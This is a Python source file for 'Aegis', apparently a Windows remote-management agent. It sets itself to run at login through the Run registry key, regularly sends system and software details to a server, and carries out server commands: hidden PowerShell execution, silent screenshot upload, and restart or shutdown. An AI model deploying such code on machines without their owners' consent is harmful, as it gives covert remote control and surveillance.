import customtkinter as ctk
import threading
import time
import requests
import psutil
import socket
import os
import sys
import winreg
import subprocess
import io
import base64
import platform
import uuid
from PIL import ImageGrab

SERVER_IP = "0.0.0.0" 
SERVER_PORT = 0000
API_TOKEN = "" 

BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}"

ctk.set_appearance_mode("Dark")

class AegisAgent(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.hostname = socket.gethostname()
        self.os_version = f"{platform.system()} {platform.release()}"
        self.pid = os.getpid()
        self.cmd_buffer = None
        
        self.setup_persistence()
        self.title(f"Aegis - {self.hostname}")
        self.geometry("600x400")
        
        self.cons = ctk.CTkTextbox(self, width=580, height=300)
        self.cons.pack(pady=10)
        self.entry = ctk.CTkEntry(self, width=400)
        self.entry.pack(side="left", padx=10)
        self.btn = ctk.CTkButton(self, text="Send Chat", command=self.send_chat)
        self.btn.pack(side="left")

        threading.Thread(target=self.loop, daemon=True).start()

    def setup_persistence(self):
        try:
            path = os.path.abspath(sys.argv[0])
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "AegisEDR", 0, winreg.REG_SZ, path)
            winreg.CloseKey(k)
        except: pass

    def log(self, m): self.cons.insert("end", f"> {m}\n"); self.cons.see("end")

    def send_chat(self):
        m = self.entry.get()
        if m:
            try:
                requests.post(f"{BASE_URL}/api/send_chat", json={'hostname': self.hostname, 'message': m})
                self.entry.delete(0, 'end')
                self.log(f"Me: {m}")
            except: pass

    def get_software(self):
        try:
            c = 'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"'
            o = subprocess.check_output(c, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
            return ", ".join([l.strip() for l in o.split('\r\n') if l.strip() and "DisplayName" not in l][:20])
        except: return ""

    def get_drives(self):
        d = []
        for p in psutil.disk_partitions():
            if 'removable' in p.opts: d.append(p.device)
        return ", ".join(d)

    def get_startup(self):
        p = []
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
            for i in range(winreg.QueryInfoKey(k)[1]): p.append(winreg.EnumValue(k, i)[0])
        except: pass
        return ", ".join(p)

    def exec_shell(self, c):
        try:
            r = subprocess.run(["powershell", "/c", c], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.cmd_buffer = f"CMD: {c}\nRES: {r.stdout + r.stderr}"
        except Exception as e: self.cmd_buffer = str(e)

    def loop(self):
        sw = self.get_software()
        while True:
            try:
                payload = {
                    'token': API_TOKEN,
                    'hostname': self.hostname,
                    'device_type': 'desktop',
                    'os_version': self.os_version,
                    'ip': socket.gethostbyname(self.hostname),
                    'public_ip': requests.get('https://api.ipify.org', timeout=2).text,
                    'cpu': psutil.cpu_percent(),
                    'ram': psutil.virtual_memory().percent,
                    'software': sw,
                    'startup': self.get_startup(),
                    'drives': self.get_drives(),
                    'cmd_output': self.cmd_buffer
                }
                if self.cmd_buffer: self.cmd_buffer = None

                r = requests.post(f"{BASE_URL}/api/heartbeat", json=payload, timeout=5)
                if r.status_code == 200:
                    d = r.json()
                    if d.get('command'):
                        c = d['command']
                        if c == 'screenshot':
                            s = ImageGrab.grab()
                            b = io.BytesIO()
                            s.save(b, format="PNG")
                            requests.post(f"{BASE_URL}/api/upload_screenshot", json={'hostname': self.hostname, 'image_data': base64.b64encode(b.getvalue()).decode()})
                        elif c == 'restart': os.system("shutdown /r /t 0")
                        elif c == 'shutdown': os.system("shutdown /s /t 0")
                        elif c.startswith('shell:'): self.exec_shell(c.split(':',1)[1])
                    
                    if d.get('chat'):
                        for m in d['chat']: self.log(f"Admin: {m}")
            except: pass
            time.sleep(5)

if __name__ == "__main__":
    app = AegisAgent()
    app.mainloop()